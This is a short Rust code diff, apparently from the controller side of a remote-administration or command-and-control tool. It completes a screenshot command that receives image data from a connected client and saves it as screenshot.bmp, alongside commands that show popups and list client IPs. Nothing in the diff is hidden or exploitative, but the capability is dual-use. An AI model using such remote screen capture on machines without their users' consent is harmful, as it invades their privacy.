@@ -64,9 +64,16 @@ pub(crate) fn popup(handle: ClientHandle, message: String) -> Result<String, Com
 
 /// Screenshots a given client's screen and saves it to a file.
 pub(crate) fn screenshot(handle: ClientHandle) -> Result<String, CommandErr> {
-    handle.send_to_client(Command::Screenshot, String::new());
-    Ok("Screenshot command is unfinished. No files were saved".to_string())
+    if let Some(buf) = handle.send_to_client(Command::Screenshot, String::new()) {
+        // Decode BMP data sent by client
+        let image_data: Vec<u8> = serde_json::from_slice(&buf)?;
+        std::fs::write("screenshot.bmp", &image_data)?;
+        Ok("Screenshot saved to screenshot.bmp".to_string())
+    } else {
+        Err(SendMessageErr("Did not receive screenshot data from client".to_string(), handle.ip))
+    }
 }
+
 
 /// Lists every client IP
 pub(crate) fn list(handles: Vec<ClientHandle>) -> Result<String, CommandErr> {
